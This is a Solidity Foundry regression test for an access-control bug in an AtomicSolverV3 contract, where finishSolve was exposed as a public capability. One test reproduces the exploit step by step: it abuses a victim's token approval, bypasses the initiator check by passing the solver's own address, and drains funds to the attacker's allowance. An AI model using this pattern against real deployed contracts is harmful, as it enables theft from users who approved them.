// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.22;

import { Test } from "@forge-std/Test.sol";
import { RolesAuthority, Authority } from "@solmate/auth/authorities/RolesAuthority.sol";
import { ERC20 } from "@solmate/tokens/ERC20.sol";
import { MockERC20 } from "@solmate/test/utils/mocks/MockERC20.sol";
import { BoringVault } from "src/base/BoringVault.sol";
import { TellerWithMultiAssetSupport } from "src/base/Roles/TellerWithMultiAssetSupport.sol";
import { AccountantWithRateProviders } from "src/base/Roles/AccountantWithRateProviders.sol";
import { AtomicQueue } from "src/atomic-queue/AtomicQueue.sol";
import { AtomicSolverV3 } from "src/atomic-queue/AtomicSolverV3.sol";

/// @title Regression tests for the [date] AtomicSolverV3 auth misconfiguration
/// @notice These tests mirror the auth wiring produced by
///         `script/ConfigureAtomicRoles.s.sol::_configure()`. If any future edit silently
///         reverts the `setRoleCapability(QUEUE_ROLE, ...)` back to `setPublicCapability(...)`
///         for `finishSolve`, the CORRECT_wiring tests will fail. The BROKEN_wiring tests
///         document the exact exploit and serve as proof-of-effectiveness of the fix.
contract AtomicSolverAuthRegression is Test {
    // Mirrors Constants.sol + ConfigureAtomicRoles.s.sol
    uint8 internal constant STRATEGIST_ROLE = 1;
    uint8 internal constant UPDATE_EXCHANGE_RATE_ROLE = 4;
    uint8 internal constant SOLVER_ROLE = 5;
    uint8 internal constant OPERATOR_ROLE = 7;
    uint8 internal constant QUEUE_ROLE = 10;

    bytes4 internal constant FINISH_SOLVE_SELECTOR =
        bytes4(keccak256("finishSolve(bytes,address,address,address,uint256,uint256)"));

    // Actors
    address internal admin = address(this);
    address internal attacker = address(0xBadB0b);
    address internal victim = address(0xdEADBEeF00000000000000000000000000000000);

    // Core contracts
    RolesAuthority internal authority;
    BoringVault internal vault;
    AccountantWithRateProviders internal accountant;
    TellerWithMultiAssetSupport internal teller;
    AtomicQueue internal queue;
    AtomicSolverV3 internal solver;

    // Assets
    MockERC20 internal want; // "USDX" analogue

    function setUp() public {
        want = new MockERC20("Hex Trust USD", "USDX", 18);

        authority = new RolesAuthority(admin, Authority(address(0)));

        vault = new BoringVault(admin, "Vault", "VLT", 18);
        accountant = new AccountantWithRateProviders(
            admin, address(vault), admin, 1e18, address(want), 1.001e4, 0.999e4, 1, 0
        );
        teller = new TellerWithMultiAssetSupport(admin, address(vault), address(accountant));
        queue = new AtomicQueue(address(accountant), admin, authority);
        solver = new AtomicSolverV3(admin, authority);

        vault.setAuthority(authority);
        accountant.setAuthority(authority);
        teller.setAuthority(authority);

        // The victim has approved the solver (standard operator pattern that existed pre-incident).
        vm.prank(victim);
        want.approve(address(solver), type(uint256).max);
        want.mint(victim, 1_000_000e18);
    }

    // ---------------------------------------------------------------------
    // CORRECT wiring (post-fix, role-gated) — mirrors ConfigureAtomicRoles
    // post patch. Verifies attacker cannot reach finishSolve.
    // ---------------------------------------------------------------------

    function _wireCorrect() internal {
        // Post-fix: finishSolve gated by QUEUE_ROLE only
        authority.setRoleCapability(QUEUE_ROLE, address(solver), FINISH_SOLVE_SELECTOR, true);
        authority.setUserRole(address(queue), QUEUE_ROLE, true);

        // Other capabilities (subset of ConfigureAtomicRoles that's relevant here)
        authority.setUserRole(address(solver), SOLVER_ROLE, true);
    }

    function test_correctWiring_attackerCannotCallFinishSolve() public {
        _wireCorrect();

        // Attacker crafts runData that would drain the victim if finishSolve ran
        bytes memory runData = abi.encode(
            AtomicSolverV3.SolveType.P2P,
            victim, // "solver" == victim (who has an approval)
            uint256(0), // minOfferReceived
            type(uint256).max // maxAssets
        );

        vm.prank(attacker);
        vm.expectRevert(); // reverts inside `requiresAuth` — attacker has no role
        solver.finishSolve(runData, address(solver), ERC20(address(want)), ERC20(address(want)), 0, 1e18);
    }

    function test_correctWiring_queueCanCallFinishSolve() public {
        _wireCorrect();

        // Simulate the queue calling back into finishSolve during a legitimate solve.
        // (We don't run a full solve; we only need to verify the auth passes.)
        // The `initiator != address(this)` check will then revert — meaning the auth layer
        // already passed. We're specifically testing: does QUEUE_ROLE let `queue` reach this function?
        bytes memory runData = abi.encode(AtomicSolverV3.SolveType.P2P, admin, uint256(0), type(uint256).max);

        vm.prank(address(queue));
        vm.expectRevert(AtomicSolverV3.AtomicSolverV3___WrongInitiator.selector);
        // Pass a deliberately-wrong initiator so we check only the auth layer, not the full solve
        solver.finishSolve(runData, address(0xdead), ERC20(address(want)), ERC20(address(want)), 0, 1e18);
    }

    function test_correctWiring_canCallMatrixIsTight() public {
        _wireCorrect();

        // Random EOA cannot reach finishSolve
        assertFalse(
            authority.canCall(attacker, address(solver), FINISH_SOLVE_SELECTOR), "attacker must not reach finishSolve"
        );
        // Capability is NOT public
        assertFalse(
            authority.isCapabilityPublic(address(solver), FINISH_SOLVE_SELECTOR),
            "finishSolve must NOT be public capability"
        );
        // Queue can reach it
        assertTrue(
            authority.canCall(address(queue), address(solver), FINISH_SOLVE_SELECTOR),
            "queue must be able to reach finishSolve"
        );
    }

    // ---------------------------------------------------------------------
    // BROKEN wiring (pre-fix) — demonstrates the exploit succeeds.
    // Documents the exact vulnerability path and asserts our fix is necessary.
    // ---------------------------------------------------------------------

    function _wireBroken() internal {
        // The exact bug: setPublicCapability instead of setRoleCapability
        authority.setPublicCapability(address(solver), FINISH_SOLVE_SELECTOR, true);
        authority.setUserRole(address(solver), SOLVER_ROLE, true);
    }

    function test_brokenWiring_reproducesExploit() public {
        _wireBroken();

        uint256 before = want.balanceOf(victim);
        uint256 amount = 100_000e18;

        // Attacker passes runData with solver=victim (who has an approval to AtomicSolverV3),
        // and `initiator = address(solver)` to bypass the parameter-based check.
        bytes memory runData = abi.encode(
            AtomicSolverV3.SolveType.P2P,
            victim,
            uint256(0),
            type(uint256).max
        );

        vm.prank(attacker);
        solver.finishSolve(
            runData,
            address(solver), // bypasses `initiator != address(this)` check
            ERC20(address(want)),
            ERC20(address(want)),
            0,
            amount
        );

        // Victim was drained. The funds sit in the solver now approved to the attacker.
        assertEq(want.balanceOf(victim), before - amount, "victim drained via broken wiring");
        assertEq(want.balanceOf(address(solver)), amount, "solver now holds victim's funds");
        assertEq(
            want.allowance(address(solver), attacker),
            amount,
            "attacker now has allowance to transferFrom the solver"
        );
    }
}
